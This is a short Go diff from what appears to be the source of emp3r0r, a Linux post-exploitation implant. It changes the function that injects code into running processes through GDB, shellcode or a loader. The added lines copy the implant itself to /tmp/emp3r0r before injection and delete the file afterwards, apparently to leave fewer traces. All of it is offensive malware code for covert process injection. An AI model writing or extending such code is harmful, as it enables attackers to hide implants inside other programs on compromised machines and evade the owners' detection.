@@ -350,7 +350,15 @@ func InjectorHandler(pid int, method string) (err error) {
 	// dispatch
 	switch method {
 	case "gdb_loader":
+		err = CopySelfTo("/tmp/emp3r0r")
+		if err != nil {
+			return
+		}
 		err = GDBInjectSO(pid)
+		err = os.RemoveAll("/tmp/emp3r0r")
+		if err != nil {
+			return
+		}
 	case "inject_shellcode":
 		shellcode, _ := prepare_sc()
 		err = ShellcodeInjector(&shellcode, pid)
@@ -361,7 +369,15 @@ func InjectorHandler(pid int, method string) (err error) {
 		// restore original binary
 		err = CopyProcExeTo(pid, util.ProcExe(pid)) // as long as the process is still running
 	case "inject_loader":
+		err = CopySelfTo("/tmp/emp3r0r")
+		if err != nil {
+			return
+		}
 		err = InjectSO(pid)
+		err = os.RemoveAll("/tmp/emp3r0r")
+		if err != nil {
+			return
+		}
 	default:
 		err = fmt.Errorf("%s is not supported", method)
 	}
